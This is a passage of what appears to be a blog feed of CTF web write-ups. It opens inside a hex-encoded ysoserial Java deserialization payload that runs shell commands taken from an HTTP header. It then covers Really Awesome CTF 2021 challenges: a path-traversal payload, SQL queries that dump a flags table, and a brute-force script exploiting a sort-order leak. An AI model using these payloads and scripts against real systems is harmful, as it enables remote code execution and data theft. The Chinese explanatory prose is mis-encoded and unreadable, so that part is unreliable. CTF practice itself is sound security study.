72F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;966fc4a2-e291-4136-84be-5bfd19b949e2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Really Awesome CTF 2021</title>
      <link href="/zh-CN/posts/ca87557c.html"/>
      <url>/zh-CN/posts/ca87557c.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Emojibook"><a href="#Emojibook" class="headerlink" title="Emojibook"></a>Emojibook</h3><blockquote><p>The flag is at <code>/flag.txt</code></p></blockquote><p>é¢˜ç›®ç»™å‡ºäº†å®Œæ•´çš„ä»£ç ï¼Œä¸”å‘Šè¯‰äº†æˆ‘ä»¬ flag æ‰€åœ¨çš„ä½ç½®ã€‚åœ¨ notes/views.py ä¸‹å¯ä»¥å‘ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_note</span>(<span class="params">request: HttpRequest, pk: <span class="built_in">int</span></span>) -&gt; HttpResponse:</span></span><br><span class="line">    note = get_object_or_404(Note, pk=pk)</span><br><span class="line">    text = note.body</span><br><span class="line">    <span class="keyword">for</span> include <span class="keyword">in</span> re.findall(<span class="string">&quot;(&#123;&#123;.*?&#125;&#125;)&quot;</span>, text):</span><br><span class="line">        <span class="built_in">print</span>(include)</span><br><span class="line">        file_name = os.path.join(<span class="string">&quot;emoji&quot;</span>, re.sub(<span class="string">&quot;[&#123;&#125;]&quot;</span>, <span class="string">&quot;&quot;</span>, include))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            text = text.replace(include, <span class="string">f&quot;&lt;img src=\&quot;data:image/png;base64,<span class="subst">&#123;base64.b64encode(file.read()).decode(<span class="string">&#x27;latin1&#x27;</span>)&#125;</span>\&quot; width=\&quot;25\&quot; height=\&quot;25\&quot; /&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;note.html&quot;</span>, &#123;<span class="string">&quot;note&quot;</span>: note, <span class="string">&quot;text&quot;</span>: text&#125;)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥å‘ç°å¡«å…¥åœ¨åŒèŠ±æ‹¬å·ä¸­çš„å†…å®¹è¢«åŒ¹é…å‡ºæ¥å¹¶ä½¿ç”¨äº† os.path.join æ‹¼æ¥åèµ‹å€¼ç»™äº†æœ€ç»ˆè¿”å›å“åº”å†…å®¹çš„æ–‡ä»¶åã€‚é‚£ä¹ˆæ­¤æ—¶å³å¯ä½¿ç”¨ç»å¯¹è·¯å¾„è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚ä½†æ˜¯è¦è¾¾æˆéœ€è¦å…ˆç»•è¿‡ç¬”è®°ä¿å­˜æ—¶çš„å¦‚ä¸‹è¿‡æ»¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">self, commit=<span class="literal">True</span></span>):</span></span><br><span class="line">    instance = <span class="built_in">super</span>(NoteCreateForm, self).save(commit=<span class="literal">False</span>)</span><br><span class="line">    instance.author = self.user</span><br><span class="line">    instance.body = instance.body.replace(<span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;emoji.json&quot;</span>) <span class="keyword">as</span> emoji_file:</span><br><span class="line">        emojis = json.load(emoji_file)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> emoji <span class="keyword">in</span> re.findall(<span class="string">&quot;(:[a-z_]*?:)&quot;</span>, instance.body):</span><br><span class="line">            instance.body = instance.body.replace(emoji, <span class="string">&quot;&#123;&#123;&quot;</span> + emojis[emoji.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)] + <span class="string">&quot;.png&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> commit:</span><br><span class="line">        instance.save()</span><br><span class="line">        self._save_m2m()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> instance</span><br></pre></td></tr></table></figure><p>å…¶å°†åŒèŠ±æ‹¬å·å’Œä¸¤ç‚¹ä¾æ¬¡è¿›è¡Œç©ºæ›¿æ¢å¤„ç†ï¼Œæ„é€ å‡ºå¦‚ä¸‹è½½è·æ¥è¾¾æˆæ¸²æŸ“ emoji ä»è€Œè¾¾æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;..&#123;&#x2F;flag.txt&#125;..&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ›¿æ¢åå³å¯æ­£å¥½è¾¾æˆ <code>&#123;&#123;/flag.txt&#125;&#125;</code>ï¼Œä»è€Œåœ¨æŸ¥çœ‹é¡µé¢ä¸­æ¸²æŸ“å‡ºå¦‚ä¸‹åŒ…å« flag çš„ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image&#x2F;png;base64,cmFjdGZ7ZGo0bmcwX2xmaX0K</span><br></pre></td></tr></table></figure><p>å°†å­—ç¬¦ä¸²ä¸­åŒ…å«çš„ Base64 å­—ç¬¦ä¸²è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;dj4ng0_lfi&#125;</span><br></pre></td></tr></table></figure><h3 id="Really-Awesome-Hidden-Service"><a href="#Really-Awesome-Hidden-Service" class="headerlink" title="Really Awesome Hidden Service"></a>Really Awesome Hidden Service</h3><p>Tor æ‰“å¼€æ‰€ç»™çš„é“¾æ¥åå¯ä»¥å¾—åˆ°å¦‚ä¸‹é¡µé¢ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629257051164705/8bc89dcda1cc9f449fd31d4c35c7ea0e89fcb763.png"></p><p>å› æ­¤éœ€è¦æƒ³åŠæ³•æ‰¾åˆ°éšè—çš„æœåŠ¡ï¼Œå‚ç…§å¦‚ä¸‹é¡µé¢å¯ä»¥æ‰¾åˆ°æ€è·¯ã€‚</p><blockquote><p><a href="https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/">https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/</a></p></blockquote><p>ç”±äºç«™ç‚¹ä½¿ç”¨çš„ favicon éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ favicon çš„ MurmurHash3 é…åˆ Shodan æ¥è¿›è¡Œé¡µé¢æœå¯»ã€‚å°†é¡µé¢æ‰€ç”¨çš„ favicon ä¸‹è½½ä¸‹æ¥åä½¿ç”¨å¦‚ä¸‹è„šæœ¬å¾—åˆ° hashã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,mmh3,base64</span><br><span class="line">favicon = base64.encodebytes(<span class="built_in">open</span>(<span class="string">&quot;./favicon.ico&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Shodan é…åˆå…³é”®è¯ http.favicon.hash:-915494641 æœç´¢å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629257334439457/21363494246d6938dfc690c67f4352e9ae3b4649.png"></p><p>å¯ä»¥å‘ç°å¾—å‡ºäº†ä¸¤ä¸ªé¡µé¢ï¼Œè®¿é—®é¡µé¢å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;DreadingPirates&#125;</span><br></pre></td></tr></table></figure><h3 id="Really-Awesome-Monitoring-Dashboard"><a href="#Really-Awesome-Monitoring-Dashboard" class="headerlink" title="Really Awesome Monitoring Dashboard"></a>Really Awesome Monitoring Dashboard</h3><p>æ‰“å¼€ç«™ç‚¹åæŸ¥çœ‹è¯·æ±‚ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸ª /api/ds/query çš„è¯·æ±‚ä¸­æäº¤äº† SQL è¯­å¥ï¼Œä¸”å…¶æ‰€ä½¿ç”¨çš„æ•°æ®åº“ç±»å‹æ˜¯ SQLiteã€‚æŒ‰ç…§å…¶è¯·æ±‚æ„é€ å‡ºå¦‚ä¸‹è½½è·æ¥å°è¯•è¯»å–å‡ºè¡¨ç»“æ„ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;queries&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;queryText&quot;</span>:<span class="string">&quot;SELECT group_concat(sql) FROM sqlite_master;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;queryType&quot;</span>:<span class="string">&quot;table&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;rawQueryText&quot;</span>:<span class="string">&quot;SELECT group_concat(sql) FROM sqlite_master;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;refId&quot;</span>:<span class="string">&quot;A&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;datasource&quot;</span>:<span class="string">&quot;sqlite&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;datasourceId&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;intervalMs&quot;</span>:<span class="number">30000</span>,</span><br><span class="line">            <span class="attr">&quot;maxDataPoints&quot;</span>:<span class="number">710</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å“åº”ä¸­ç¡®å®åŒ…å«äº†è¡¨çš„ç»“æ„ï¼Œå¤„ç†ä¹‹åå¾—åˆ°å¦‚ä¸‹è¡¨ç»“æ„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &quot;logs&quot; (</span><br><span class="line">&quot;host&quot;TEXT NOT NULL,</span><br><span class="line">&quot;status&quot;TEXT NOT NULL</span><br><span class="line">),CREATE TABLE &quot;flags&quot; (</span><br><span class="line">&quot;challenge&quot;INTEGER NOT NULL,</span><br><span class="line">&quot;flag&quot;TEXT NOT NULL</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å› æ­¤è¿›ä¸€æ­¥æ„é€ å‡ºå¦‚ä¸‹è½½è·è¯»å–å‡º flagã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;queries&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;queryText&quot;</span>:<span class="string">&quot;SELECT group_concat(flag) FROM flags;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;queryType&quot;</span>:<span class="string">&quot;table&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;rawQueryText&quot;</span>:<span class="string">&quot;SELECT group_concat(flag) FROM flags;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;refId&quot;</span>:<span class="string">&quot;A&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;datasource&quot;</span>:<span class="string">&quot;sqlite&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;datasourceId&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;intervalMs&quot;</span>:<span class="number">30000</span>,</span><br><span class="line">            <span class="attr">&quot;maxDataPoints&quot;</span>:<span class="number">710</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†åŒ…å«è½½è·çš„è¯·æ±‚å‘é€å³å¯åœ¨å“åº”ä¸­å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;BringBackNagios&#125;</span><br></pre></td></tr></table></figure><h3 id="Secret-Store"><a href="#Secret-Store" class="headerlink" title="Secret Store"></a>Secret Store</h3><blockquote><p>How many secrets could a secret store store if a store could store secrets?</p></blockquote><p>é¢˜ç›®ç»™å‡ºçš„æºç å…³é”®éƒ¨åˆ†å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretViewSet</span>(<span class="params">viewsets.ModelViewSet</span>):</span></span><br><span class="line">    queryset = Secret.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = SecretSerializer</span><br><span class="line">    permission_classes = (IsAuthenticated &amp; IsSecretOwnerOrReadOnly,)</span><br><span class="line">    filter_backends = [filters.OrderingFilter]</span><br><span class="line">    ordering_fields = <span class="string">&quot;__all__&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨ç™»å½•åæŒ‰ç…§æç¤ºè®¿é—® /api/secret/ è·¯ç”±å¯ä»¥æäº¤ä¸€ä¸ª secretï¼Œåœ¨å°è¯•ä¹‹ä¸‹å¯ä»¥å‘ç° GET è¯·æ±‚è¿™ä¸ªè·¯ç”±å¯ä»¥å¾—åˆ°ç›®å‰æ‰€æœ‰å­˜å‚¨çš„ secret çš„åŸºæœ¬ä¿¡æ¯ã€‚æ­¤æ—¶å†æ¥çœ‹è¿™ä¸ª ViewSetï¼Œæ³¨æ„åˆ°ä»–çš„ ordering_filelds çš„å€¼è¢«è®¾å®šä¸ºäº† __all__ã€‚æŸ¥é˜… Django çš„æ–‡æ¡£å¯ä»¥å‘ç°æœ‰å¦‚ä¸‹æè¿°ã€‚</p><blockquote><p>If you are confident that the queryset being used by the view doesnâ€™t contain any sensitive data, you can also explicitly specify that a view should allow ordering on <em>any</em> model field or queryset aggregate, by using the special value <code>&#39;__all__&#39;</code>.</p></blockquote><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æŒ‡å®šä»»æ„çš„ä¸€ä¸ªé”®å€¼ä½œä¸ºæ’åºçš„ä¾æ®ï¼Œè€Œå½“æˆ‘ä»¬åå¤è¦†å†™çš„ value è¾¾åˆ°è·Ÿ id ä¸º 1 çš„ secret çš„ä¸´ç•Œå€¼çš„æ—¶å€™ï¼Œå°±å¯ä»¥å¾—å‡ºæŸä¸€ä½çš„å€¼ã€‚è­¬å¦‚åœ¨å†…å®¹ä¸º rb çš„æ—¶å€™ï¼Œæ’åºåº”è¯¥ä½äºæ‰€æ±‚ secret çš„ ra çš„ä¸‹æ–¹ï¼Œè€Œ ra çš„æ—¶å€™åˆ™å¯èƒ½æœ‰æ‰€å˜åŒ–ã€‚æŒ‰ç…§è¿™ä¸ªè§„åˆ™å†™å‡ºå¦‚ä¸‹è„šæœ¬æ¥è·å– flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Client(base_url=<span class="string">&quot;http://193.57.159.27:49687/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fetch CSRF token</span></span><br><span class="line">response = session.get(<span class="string">&quot;/auth/login&quot;</span>)</span><br><span class="line">html = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">csrfToken = html.find_all(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>][<span class="string">&quot;value&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] found CSRF token <span class="subst">&#123;csrfToken&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Login</span></span><br><span class="line">response = session.post(<span class="string">&quot;/auth/login/&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;csrfmiddlewaretoken&quot;</span>: csrfToken,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;atest&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;thisisapassword&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">assert</span> <span class="string">&quot;Hi&quot;</span> <span class="keyword">in</span> response.content.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] login successfully!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bruteforce flag</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">characters = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    signal = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(characters)):</span><br><span class="line">        response = session.post(<span class="string">&quot;/api/secret/&quot;</span>, json=&#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: flag + characters[x]</span><br><span class="line">        &#125;,headers=&#123;</span><br><span class="line">            <span class="string">&quot;X-CSRFToken&quot;</span>: session.cookies[<span class="string">&#x27;csrftoken&#x27;</span>]</span><br><span class="line">        &#125;)</span><br><span class="line">        selfSecretId = json.loads(response.content.decode())[<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">        response = session.get(<span class="string">&quot;/api/secret/&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;ordering&quot;</span>: <span class="string">&quot;value&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        data = json.loads(response.content.decode())</span><br><span class="line">        <span class="keyword">for</span> datum <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> datum[<span class="string">&quot;id&quot;</span>] == selfSecretId:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> datum[<span class="string">&quot;id&quot;</span>] == <span class="number">1</span>:</span><br><span class="line">                signal = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> signal == <span class="literal">True</span>:</span><br><span class="line">            flag += characters[x - <span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;data_exf1l_via_s0rt1ng_0c66de47&#125;</span><br></pre></td></tr></table></figure><h3 id="Military-Grade"><a href="#Military-Grade" class="headerlink" title="Military Grade"></a>Military Grade</h3><blockquote><p>Go is safe, right? That means my implementation of AES will be secure?</p></blockquote><p>é¢˜ç›®ç»™å‡ºçš„æºç å¦‚ä¸‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 